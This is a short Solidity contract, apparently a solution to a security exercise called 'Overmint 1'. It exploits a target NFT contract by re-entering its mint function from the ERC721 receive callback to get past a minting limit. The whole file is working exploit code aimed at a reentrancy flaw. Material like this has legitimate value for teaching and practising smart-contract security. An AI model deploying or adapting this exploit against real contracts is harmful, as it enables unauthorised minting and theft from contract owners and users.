// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.11;

import {Overmint1} from "./Overmint1.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/// @title Overmint 1 Attacker
/// @author Julissa Dantes
/// @notice This contract will exploit Overmint 1 to bypass the minting restriction
contract Overmint1Attacker is IERC721Receiver {
    address public victim;
    uint256 public counter;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() public {
        counter++;
        Overmint1(victim).mint();
    }
    
    /// @notice Uses reentrancy to bypass a minting restriction
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) public returns (bytes4) {
        if (counter < 5) {
            attack();
        }
        return 0x150b7a02;
    }
}
